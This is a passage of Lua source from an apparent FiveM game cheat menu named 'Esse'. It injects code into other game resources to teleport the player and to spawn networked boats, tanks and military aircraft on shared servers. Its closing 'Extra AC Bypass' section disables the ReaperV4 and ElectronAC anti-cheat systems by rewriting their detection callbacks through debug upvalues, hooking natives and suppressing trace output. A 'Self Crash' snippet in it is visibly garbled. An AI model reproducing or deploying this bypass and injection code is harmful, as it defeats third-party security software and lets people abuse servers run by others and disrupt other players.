                    ]])
                                else
                                    MachoInjectResourceRaw("any", [[
                        local function oypB9FcNwK()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 425.1, -979.5, 30.7
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        oypB9FcNwK()
                        ]])
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Pillbox Hospital",
                            onSelect = function()
                                local waveShieldStart = GetResourceState("WaveShield") == 'started'
                                local ReaperStart = GetResourceState("ReaperV4") == 'started'

                                if waveShieldStart then
                                    MachoInjectResourceRaw("WaveShield", [[
                        local function TmXU0zLa4e()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 308.6, -595.3, 43.28
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        TmXU0zLa4e()
                        ]])
                                elseif
                                    ReaperStart then
                                    MachoInjectThread(0, "any", "", [[
                    local function TmXU0zLa4e()
                        local aSdFgHjKlQwErTy = PlayerPedId
                        local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                        local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                        local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                        local x, y, z = 308.6, -595.3, 43.28
                        local ped = aSdFgHjKlQwErTy()
                        local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                        xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                    end

                    TmXU0zLa4e()
                    ]])
                                else
                                    MachoInjectResourceRaw("any", [[
                        local function TmXU0zLa4e()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 308.6, -595.3, 43.28
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        TmXU0zLa4e()
                        ]])
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Grove Street",
                            onSelect = function()
                                local waveShieldStart = GetResourceState("WaveShield") == 'started'
                                local ReaperStart = GetResourceState("ReaperV4") == 'started'

                                if waveShieldStart then
                                    MachoInjectResourceRaw("WaveShield", [[
                        local function YrAFvPMkqt()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 109.63, -1943.14, 20.80
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        YrAFvPMkqt()
                        ]])
                                elseif
                                    ReaperStart then
                                    MachoInjectThread(0, "any", "", [[
                    local function YrAFvPMkqt()
                        local aSdFgHjKlQwErTy = PlayerPedId
                        local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                        local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                        local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                        local x, y, z = 109.63, -1943.14, 20.80
                        local ped = aSdFgHjKlQwErTy()
                        local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                        xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                    end

                    YrAFvPMkqt()
                    ]])
                                else
                                    MachoInjectResourceRaw("any", [[
                        local function YrAFvPMkqt()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 109.63, -1943.14, 20.80
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        YrAFvPMkqt()
                        ]])
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Legion Square",
                            onSelect = function()
                                local waveShieldStart = GetResourceState("WaveShield") == 'started'
                                local ReaperStart = GetResourceState("ReaperV4") == 'started'

                                if waveShieldStart then
                                    MachoInjectResourceRaw("WaveShield", [[
                        local function zdVCXL8rjp()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 229.21, -871.61, 30.49
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        zdVCXL8rjp()
                        ]])
                                elseif
                                    ReaperStart then
                                    MachoInjectThread(0, "any", "", [[
                        local function zdVCXL8rjp()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 229.21, -871.61, 30.49
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        zdVCXL8rjp()
                        ]])
                                else
                                    MachoInjectResourceRaw("any", [[
                        local function zdVCXL8rjp()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 229.21, -871.61, 30.49
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        zdVCXL8rjp()
                        ]])
                                end
                            end
                        },
                    }
                },
            }
        },

        {
            icon = "",
            label = "World Spawning",
            type = "subMenu",
            categories = {
                {
                    label = "World Objects",
                    tabs = {
                        { type = "divider", label = "Luxury Spawns" },
                        {
                            type = "button",
                            label = "Spawn Yacht",
                            desc = "Spawn a luxury yacht near your location (Everyone Sees).",
                            onSelect = function()
                                Esse:Notify("warning", "Esse", "Spawning Yacht - RISKY", 3000)
                                MachoInjectResourceRaw("any", [[
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)

                                -- Yacht model
                                local yachtModel = GetHashKey("apa_mp_apa_yacht")
                                RequestModel(yachtModel)
                                while not HasModelLoaded(yachtModel) do Wait(10) end

                                -- Spawn yacht in water nearby
                                local spawnX = playerCoords.x + 50.0
                                local spawnY = playerCoords.y + 50.0
                                local spawnZ = 0.0

                                local yacht = CreateObject(yachtModel, spawnX, spawnY, spawnZ, true, true, true)

                                -- Make visible to others
                                NetworkRegisterEntityAsNetworked(yacht)
                                local netId = NetworkGetNetworkIdFromEntity(yacht)
                                SetNetworkIdCanMigrate(netId, true)
                                SetNetworkIdExistsOnAllMachines(netId, true)
                                SetEntityAsMissionEntity(yacht, true, true)

                                PlaceObjectOnGroundProperly(yacht)
                                SetModelAsNoLongerNeeded(yachtModel)


                            ]])
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Spawn Boat",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "Dinghy", "Jetmax", "Marquis", "Speeder", "Squalo", "Submersible", "Toro", "Tropic", "Tug" },
                            desc = "Spawn a boat near your location.",
                            onSelect = function(value)
                                Esse:Notify("success", "Esse", "Spawning " .. value, 3000)
                                local boatModels = {
                                    ["Dinghy"] = "dinghy",
                                    ["Jetmax"] = "jetmax",
                                    ["Marquis"] = "marquis",
                                    ["Speeder"] = "speeder",
                                    ["Squalo"] = "squalo",
                                    ["Submersible"] = "submersible",
                                    ["Toro"] = "toro",
                                    ["Tropic"] = "tropic",
                                    ["Tug"] = "tug"
                                }
                                local model = boatModels[value] or "dinghy"
                                MachoInjectResourceRaw("any", string.format([[
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)
                                local heading = GetEntityHeading(playerPed)

                                local modelHash = GetHashKey("%s")
                                RequestModel(modelHash)
                                while not HasModelLoaded(modelHash) do Wait(10) end

                                local boat = CreateVehicle(modelHash, playerCoords.x + 10.0, playerCoords.y + 10.0, playerCoords.z, heading, true, true)

                                -- Make visible to others
                                NetworkRegisterEntityAsNetworked(boat)
                                local netId = NetworkGetNetworkIdFromEntity(boat)
                                SetNetworkIdCanMigrate(netId, true)
                                SetNetworkIdExistsOnAllMachines(netId, true)
                                SetEntityAsMissionEntity(boat, true, true)

                                SetModelAsNoLongerNeeded(modelHash)
                            ]], model))
                            end
                        },
                        { type = "divider", label = "Ramps & Props" },
                        {
                            type = "scrollable",
                            label = "Spawn Ramp",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "Small Ramp", "Large Ramp", "Stunt Ramp", "Container Ramp" },
                            desc = "Create jump ramps anywhere",
                            onSelect = function(value)
                                Esse:Notify("warning", "Esse", "Spawning " .. value .. " - RISKY", 3000)
                                local rampModels = {
                                    ["Small Ramp"] = "prop_mp_ramp_01",
                                    ["Large Ramp"] = "prop_mp_ramp_02",
                                    ["Stunt Ramp"] = "prop_mp_ramp_03",
                                    ["Container Ramp"] = "prop_container_ld2"
                                }
                                local model = rampModels[value] or "prop_mp_ramp_01"
                                MachoInjectResourceRaw("any", string.format([[
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)
                                local heading = GetEntityHeading(playerPed)

                                local modelHash = GetHashKey("%s")
                                RequestModel(modelHash)
                                while not HasModelLoaded(modelHash) do Wait(10) end

                                local forwardX = playerCoords.x + math.cos(math.rad(heading)) * 10.0
                                local forwardY = playerCoords.y + math.sin(math.rad(heading)) * 10.0

                                local ramp = CreateObject(modelHash, forwardX, forwardY, playerCoords.z, true, true, true)

                                -- Make visible to others
                                NetworkRegisterEntityAsNetworked(ramp)
                                local netId = NetworkGetNetworkIdFromEntity(ramp)
                                SetNetworkIdCanMigrate(netId, true)
                                SetNetworkIdExistsOnAllMachines(netId, true)
                                SetEntityAsMissionEntity(ramp, true, true)

                                SetEntityHeading(ramp, heading)
                                PlaceObjectOnGroundProperly(ramp)
                                FreezeEntityPosition(ramp, true)
                                SetModelAsNoLongerNeeded(modelHash)
                            ]], model))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Spawn Props",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "Barrier", "Cone", "Dumpster", "Container", "Porta Potty", "Tent", "Bench", "Street Light" },
                            desc = "Spawn various props at your location.",
                            onSelect = function(value)
                                Esse:Notify("success", "Esse", "Spawning " .. value, 3000)
                                local propModels = {
                                    ["Barrier"] = "prop_barrier_work06a",
                                    ["Cone"] = "prop_roadcone02a",
                                    ["Dumpster"] = "prop_dumpster_01a",
                                    ["Container"] = "prop_container_01a",
                                    ["Porta Potty"] = "prop_portaloo_01a",
                                    ["Tent"] = "prop_skid_tent_01",
                                    ["Bench"] = "prop_bench_01a",
                                    ["Street Light"] = "prop_streetlight_01"
                                }
                                local model = propModels[value] or "prop_roadcone02a"
                                MachoInjectResourceRaw("any", string.format([[
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)
                                local heading = GetEntityHeading(playerPed)

                                local modelHash = GetHashKey("%s")
                                RequestModel(modelHash)
                                while not HasModelLoaded(modelHash) do Wait(10) end

                                local forwardX = playerCoords.x + math.cos(math.rad(heading)) * 3.0
                                local forwardY = playerCoords.y + math.sin(math.rad(heading)) * 3.0

                                local prop = CreateObject(modelHash, forwardX, forwardY, playerCoords.z, true, true, true)

                                -- Make visible to others
                                NetworkRegisterEntityAsNetworked(prop)
                                local netId = NetworkGetNetworkIdFromEntity(prop)
                                SetNetworkIdCanMigrate(netId, true)
                                SetNetworkIdExistsOnAllMachines(netId, true)
                                SetEntityAsMissionEntity(prop, true, true)

                                SetEntityHeading(prop, heading)
                                PlaceObjectOnGroundProperly(prop)
                                SetModelAsNoLongerNeeded(modelHash)
                            ]], model))
                            end
                        },
                        { type = "divider", label = "Management" },
                        {
                            type = "button",
                            label = "Delete Nearby Objects",
                            desc = "Remove all spawned objects near you.",
                            onSelect = function()
                                Esse:Notify("success", "Esse", "Deleting Nearby Objects", 3000)
                                MachoInjectResourceRaw("any", [[
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)
                                local objects = GetGamePool('CObject')
                                local deleted = 0

                                for _, obj in ipairs(objects) do
                                    if DoesEntityExist(obj) then
                                        local objCoords = GetEntityCoords(obj)
                                        local distance = #(playerCoords - objCoords)
                                        if distance < 30.0 then
                                            DeleteEntity(obj)
                                            deleted = deleted + 1
                                        end
                                    end
                                end

                            ]])
                            end
                        },
                    }
                },
                {
                    label = "Military & Aircraft",
                    tabs = {
                        { type = "divider", label = "Aircraft" },
                        {
                            type = "scrollable",
                            label = "Spawn Aircraft",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "Buzzard", "Hydra", "Lazer", "Savage", "Valkyrie", "Akula", "Hunter", "Volatol", "Avenger", "Titan", "Cargo Plane" },
                            desc = "Spawn military aircraft.",
                            onSelect = function(value)
                                Esse:Notify("success", "Esse", "Spawning " .. value, 3000)
                                local aircraftModels = {
                                    ["Buzzard"] = "buzzard",
                                    ["Hydra"] = "hydra",
                                    ["Lazer"] = "lazer",
                                    ["Savage"] = "savage",
                                    ["Valkyrie"] = "valkyrie",
                                    ["Akula"] = "akula",
                                    ["Hunter"] = "hunter",
                                    ["Volatol"] = "volatol",
                                    ["Avenger"] = "avenger",
                                    ["Titan"] = "titan",
                                    ["Cargo Plane"] = "cargoplane"
                                }
                                local model = aircraftModels[value] or "buzzard"
                                MachoInjectResourceRaw("any", string.format([[
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)
                                local heading = GetEntityHeading(playerPed)

                                local modelHash = GetHashKey("%s")
                                RequestModel(modelHash)
                                while not HasModelLoaded(modelHash) do Wait(10) end

                                local aircraft = CreateVehicle(modelHash, playerCoords.x + 20.0, playerCoords.y + 20.0, playerCoords.z + 50.0, heading, true, true)

                                -- Make visible to others
                                NetworkRegisterEntityAsNetworked(aircraft)
                                local netId = NetworkGetNetworkIdFromEntity(aircraft)
                                SetNetworkIdCanMigrate(netId, true)
                                SetNetworkIdExistsOnAllMachines(netId, true)
                                SetEntityAsMissionEntity(aircraft, true, true)

                                SetVehicleEngineOn(aircraft, true, true, false)
                                SetModelAsNoLongerNeeded(modelHash)
                            ]], model))
                            end
                        },
                        { type = "divider", label = "Military Vehicles" },
                        {
                            type = "scrollable",
                            label = "Spawn Military",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "Rhino Tank", "Khanjali Tank", "APC", "Insurgent", "Barrage", "Half-Track", "Weaponized Tampa", "Anti-Aircraft Trailer" },
                            desc = "Spawn military ground vehicles.",
                            onSelect = function(value)
                                Esse:Notify("success", "Esse", "Spawning " .. value, 3000)
                                local militaryModels = {
                                    ["Rhino Tank"] = "rhino",
                                    ["Khanjali Tank"] = "khanjali",
                                    ["APC"] = "apc",
                                    ["Insurgent"] = "insurgent3",
                                    ["Barrage"] = "barrage",
                                    ["Half-Track"] = "halftrack",
                                    ["Weaponized Tampa"] = "tampa3",
                                    ["Anti-Aircraft Trailer"] = "trailersmall2"
                                }
                                local model = militaryModels[value] or "rhino"
                                MachoInjectResourceRaw("any", string.format([[
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)
                                local heading = GetEntityHeading(playerPed)

                                local modelHash = GetHashKey("%s")
                                RequestModel(modelHash)
                                while not HasModelLoaded(modelHash) do Wait(10) end

                                local vehicle = CreateVehicle(modelHash, playerCoords.x + 5.0, playerCoords.y + 5.0, playerCoords.z, heading, true, true)

                                -- Make visible to others
                                NetworkRegisterEntityAsNetworked(vehicle)
                                local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                SetNetworkIdCanMigrate(netId, true)
                                SetNetworkIdExistsOnAllMachines(netId, true)
                                SetEntityAsMissionEntity(vehicle, true, true)

                                SetVehicleOnGroundProperly(vehicle)
                                SetModelAsNoLongerNeeded(modelHash)
                            ]], model))
                            end
                        },
                    }
                },
            }
        },

        {
            icon = "",
            label = "Settings",
            type = "subMenu",
            categories = {

                {
                    label = "Settings",
                    tabs = {
                        {
                            type = "subMenu",
                            label = "Keybinds",
                            subTabs = {
                                {
                                    icon = "",
                                    type = "button",
                                    label = "Menu Key",
                                    onSelect = function()
                                        KeyboardInput("Choose Menu Key", "", function(val)
                                            for vk, name in pairs(MappedKeys) do
                                                if name:lower() == val:lower() then
                                                    MenuKey = name
                                                    Wait(250)
                                                    Esse:ShowUI()
                                                    return
                                                end
                                            end
                                        end, "keybind")
                                    end
                                },
                                {
                                    icon = "",
                                    type = "checkbox",
                                    label = "Keybinds soon",

                                    onSelect = function()
                                        if not toggleDisplay then
                                            -- FIRST CLICK = ON
                                            Esse:SendMessage({ action = "displayBinds", visible = true })
                                            toggleDisplay = true
                                        else
                                            -- SECOND CLICK = OFF
                                            Esse:SendMessage({ action = "displayBinds", visible = false })
                                            toggleDisplay = false
                                        end
                                    end
                                },
                            }
                        },
                        {
                            icon = "",
                            type = "button",
                            label = "Self Crash",
                            desc = "Crashes your game",
                            onSelect = function()
                                MachoInjectResourceRaw("any", [[
                    function SimpleJsonEncode(value)
                        if type(value) == "table" then
                            local parts = {}
                            local isArray = true
                            local maxIndex = 0

                            for k, _ in pairs(value) do
                                if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                    isArray = false
                                    break
                                end
                                maxIndex = math.max(maxIndex, k)
                            end

                            if isArray then
                                for i = 1, maxIndex do
                                    local v = value[i]
                                    if v == nil then
                                        parts[i] = "null"
                                    else
                                        parts[i] = SimpleJsonEncode(v)
                                    end
                                end
                                return "[" .. table.concat(parts, ",") .. "]"
                            else
                                for k, v in pairs(value) do
                                    if type(k) == "string" then
                                        local encodedValue = SimpleJsonEncode(v)
                                        parts[#parts + 1] = "\"" .. k .. "\":" .. encodedValue
                                    end
                                end
                                return "{" .. table.concat(parts, ",") .. "}"
                            end
                        elseif type(value) == "string" then
                            return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                        elseif type(value) == "number" or type(value) == "boolean" then
                            return tostring(value)
                        elseif value == nil then
                            return "null"
                        else
                            return "\"[unserializable:" .. type(value) .. "]\""
                        end
                    end

                    function HookNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            local info = debug.getinfo(2, "Sln")
                            return newFunction(originalNative, ...)
                        end
                    end

                        local args = {...}
                        local encodedArgs = {}

                        for i, arg in ipairs(args) do
                            encodedArgs[i] = SimpleJsonEncode(arg)
                        end

                        return originalFn(eventName, ...)
                    end)

                        local args = {...}
                        local encodedArgs = {}

                        for i, arg in ipairs(args) do
                            encodedArgs[i] = SimpleJsonEncode(arg)
                        end

                        return originalFn(eventName, ...)
                    end)
                    ]])
                            end
                        },

                    }
                },
                {
                    label = "Design",
                    tabs = {
                        {
                            type = "subMenu",
                            label = "Banners",
                            subTabs = (function()
                                -- Mga default banner para sa lahat
                                local tabs = {
                                    {
                                        icon = "",
                                        type = "button",
                                        label = "Esse Banner (Default)",
                                        onSelect = function()
                                            Esse:SendMessage({ action = "updateBanner", bannerColor =
                                            "255, 255, 255", bannerLink =
                                            "https://r2.fivemanage.com/8HOeTCzBo1TKiGtVntgQ4/AdobeExpress-0328(6).gif" })
                                        end
                                    },
                                    {
                                        icon = "",
                                        type = "button",
                                        label = "DeGuzman Banner (Default)",
                                        onSelect = function()
                                            Esse:SendMessage({ action = "updateBanner", bannerColor =
                                            "255, 255, 255", bannerLink =
                                            "https://media.discordapp.net/attachments/1443717448481112114/1514636557183746078/text.gif?ex=6a2c16b7&is=6a2ac537&hm=860779bfde5317fac3611b069b9d05063eb9e98b6a5c7dc2a91adfaf77aa98c0&=" })
                                        end
                                    },
                                }
                                -------------------------------- Staff exclusive banners (kung staff ang user)----------------------------
                                if _G.LoggedStaff then
                                    table.insert(tabs, { type = "divider", label = "Staff Exclusive Banners" })
                                    table.insert(tabs, {
                                        icon = "",
                                        type = "button",
                                        label = "Shxyy Luvs u Banner",
                                        onSelect = function()
                                            Esse:SendMessage({
                                                action = "updateBanner",
                                                bannerColor = "255, 255, 255",
                                                bannerLink =
                                                "https://r2.fivemanage.com/8HOeTCzBo1TKiGtVntgQ4/0328(2).gif" -- palitan mo ng URL mamaya
                                            })
                                        end
                                    })
                                    table.insert(tabs, {
                                        icon = "",
                                        type = "button",
                                        label = "Constantine Luvs U Banner",
                                        onSelect = function()
                                            Esse:SendMessage({
                                                action = "updateBanner",
                                                bannerColor = "255, 255, 255",
                                                bannerLink =
                                                "https://www.image2url.com/r2/default/gifs/1780548635040-5b2df8c1-4b2f-4f16-a70c-48d876ddc5b0.gif"
                                            })
                                        end
                                    })
                                    table.insert(tabs, {
                                        icon = "",
                                        type = "button",
                                        label = "Jiyo luvs U Okay",
                                        onSelect = function()
                                            Esse:SendMessage({
                                                action = "updateBanner",
                                                bannerColor = "255, 255, 255",
                                                bannerLink =
                                                "https://r2.fivemanage.com/8HOeTCzBo1TKiGtVntgQ4/03283_2.gif" -- palitan mo ng URL mamaya
                                            })
                                        end
                                    })
                                end

                                return tabs
                            end)()
                        },




























                        {
                            type = "subMenu",
                            label = "Custom Colors",
                            subTabs = {
                                {
                                    icon = "",
                                    type = "button",
                                    label = "Red",
                                    onSelect = function()
                                        Esse:SendMessage({ action = "updateBanner", bannerColor = "255, 0, 0", })
                                    end
                                },
                                {
                                    icon = "",
                                    type = "button",
                                    label = "Green",
                                    onSelect = function()
                                        Esse:SendMessage({ action = "updateBanner", bannerColor = "0, 255, 0", })
                                    end
                                },
                                {
                                    icon = "",
                                    type = "button",
                                    label = "Blue",
                                    onSelect = function()
                                        Esse:SendMessage({ action = "updateBanner", bannerColor = "0, 0, 255", })
                                    end
                                },
                                {
                                    icon = "",
                                    type = "button",
                                    label = "Purple",
                                    onSelect = function()
                                        Esse:SendMessage({ action = "updateBanner", bannerColor = "128, 0, 128", })
                                    end
                                },
                                {
                                    icon = "",
                                    type = "button",
                                    label = "Yellow",
                                    onSelect = function()
                                        Esse:SendMessage({ action = "updateBanner", bannerColor = "255, 255, 0", })
                                    end
                                },
                                {
                                    icon = "",
                                    type = "button",
                                    label = "Orange",
                                    onSelect = function()
                                        Esse:SendMessage({ action = "updateBanner", bannerColor = "255, 165, 0", })
                                    end
                                },
                                {
                                    icon = "",
                                    type = "button",
                                    label = "Cyan",
                                    onSelect = function()
                                        Esse:SendMessage({ action = "updateBanner", bannerColor = "0, 255, 255", })
                                    end
                                },
                                {
                                    icon = "",
                                    type = "button",
                                    label = "Magenta",
                                    onSelect = function()
                                        Esse:SendMessage({ action = "updateBanner", bannerColor = "255, 0, 255", })
                                    end
                                },
                                {
                                    icon = "",
                                    type = "button",
                                    label = "Pink",
                                    onSelect = function()
                                        Esse:SendMessage({ action = "updateBanner", bannerColor = "255, 192, 203", })
                                    end
                                },
                                {
                                    icon = "",
                                    type = "button",
                                    label = "Brown",
                                    onSelect = function()
                                        Esse:SendMessage({ action = "updateBanner", bannerColor = "165, 42, 42", })
                                    end
                                },
                                {
                                    icon = "",
                                    type = "button",
                                    label = "Gray",
                                    onSelect = function()
                                        Esse:SendMessage({ action = "updateBanner", bannerColor = "128, 128, 128", })
                                    end
                                },
                                {
                                    icon = "",
                                    type = "button",
                                    label = "Black",
                                    onSelect = function()
                                        Esse:SendMessage({ action = "updateBanner", bannerColor = "0, 0, 0", })
                                    end
                                },
                            }
                        },
                        {
                            icon = "",
                            type = "button",
                            label = "Reset Ui",
                            onSelect = function()
                                Esse:SendMessage({ action = "updateBanner", bannerColor = "225, 225, 225", bannerLink =
                                "https://r2.fivemanage.com/8HOeTCzBo1TKiGtVntgQ4/AdobeExpress-0328(6).gif" })
                            end
                        },

                    }
                },


                {
                    label = "Extra Bypass",
                    tabs = {
                        {
                            label = 'Extra AC Bypass',
                            desc =
                            'this will bypass fully client side electron + fiveguard + reaperv4 + eagle ac + some custom ac',
                            type = 'checkbox',
                            checked = false, -- default off
                            onSelect = function(setToggle)
                                if setToggle then
                                    -- ENABLE BYPASS
                                    local restrictedIPs = {
                                        "216.146.24.88:30120",
                                        "91.190.154.74:30120"
                                    }
                                    local currentEndpoint = GetCurrentServerEndpoint()
                                    for _, ip in ipairs(restrictedIPs) do
                                        if currentEndpoint == ip then
                                            Esse:Notify("error", "Esse", "Bypass disabled on this server.",
                                                3000)
                                            return
                                        end
                                    end

                                    ScanElectronAnticheat()
                                    ScanFiveGuardAnticheat()
                                    Wait(1000)

                                    -- ReaperV4 Bypass
                                    if GetResourceState("ReaperV4") == "started" then
                                        MachoInjectResource2("AsThreadNs", "ReaperV4", [[
                pcall(function()
                    local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                    local eventHandlers = {}
                    for name, raw in pairs(eventHandlersRaw) do
                        if raw.handlers then
                            for id, v in pairs(raw.handlers) do
                                table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                            end
                        end
                    end
                    local reaper_newdetection
                    for i, v in pairs(eventHandlers) do
                        local name = v["handle"]["name"]
                        local func = v["func"]
                        if name == "Reaper:NewDetection" then
                            reaper_newdetection = func
                        end
                    end
                    if type(reaper_newdetection) ~= "function" then
                        return print("error")
                    end
                    local _, securityclient = debug.getupvalue(reaper_newdetection, 1)
                    for name, detection in pairs(securityclient["detections"]) do
                        if detection["detected"] then
                            securityclient["detections"][name]["detected"] = function(...) return end
                        end
                        if detection["callback"] then
                            securityclient["detections"][name]["callback"] = function(...) return end
                        end
                    end
                    for name, detection in pairs(securityclient["active_detections"]) do
                        if detection["detected"] then
                            securityclient["active_detections"][name]["detected"] = function(...) return end
                        end
                        if detection["callback"] then
                            securityclient["active_detections"][name]["callback"] = function(...) return end
                        end
                    end
                    Debug.setupvalue(reaper_newdetection, 1, securityclient)
                    print("ReaperV4 | Client Bypassed")
                end)
            ]])

                                        MachoHookNative(0xC6D3D26810C8E0F9, function(...) return false, false end)
                                        MachoHookNative(0x8D4D46230B2C353A, function(...) return false, 3 end)
                                        MachoHookNative(0xB15162CB5826E9E8, function(...) return false, true end)
                                        MachoHookNative(0xD5037BA82E12416F, function(...) return false, 0 end)
                                        MachoHookNative(0xFB92A102F1C4DFA3, function(...) return false, true end)
                                        print("ReaperV4 Bypass Enabled")
                                    elseif electronResource ~= nil then
                                        Injection("ElectronAC", [[
                print = function() end
                local originalTrace = Citizen.Trace
                Citizen.Trace = function(msg)
                    if not (string.find(msg, "DEBUG") or string.find(msg, "NEWDBG") or string.find(msg, "A11AXXX") or string.find(msg, "function") or string.find(msg, "TriggerServerEvent")) then
                        originalTrace(msg)
                    end
                end
            ]])
                                        MachoInjectResource2("AsThreadNs", "ElectronAC", [[
                pcall(function()
                    local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                    local eventHandlers = {}
                    for name, raw in pairs(eventHandlersRaw) do
                        if raw.handlers then
                            for id, v in pairs(raw.handlers) do
                                table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                            end
                        end
                    end
                    local eAcVerify
                    for i, v in ipairs(eventHandlers) do
                        local name = v["handle"]["name"]
                        local func = v["func"]
                        if name == "ElectronAC.verify" then
                            local upname, func = debug.getupvalue(func, 1)
                            eAcVerify = func
                        end
                    end
                    local EACTable = nil
                    local eacUpvalueIndex = nil
                    local i = 1
                    while true do
                        local name, value = debug.getupvalue(eAcVerify, i)
                        if not name then break end
                        if type(value) == "table" then
                            local hasEACStructure = false
                            for idx, tbl in pairs(value) do
                                if type(tbl) == "string" then
                                    if tbl == "antiNuiBlocker" or tbl == "antiInvisible" then
                                        hasEACStructure = true
                                    end
                                    if hasEACStructure then break end
                                end
                            end
                            if hasEACStructure then
                                EACTable = value
                                eacUpvalueIndex = i
                                break
                            end
                        end
                        i = i + 1
                    end
                    if not EACTable then
                        print("EAC table not found!")
                        return
                    end
                    local punish = function(...) return end
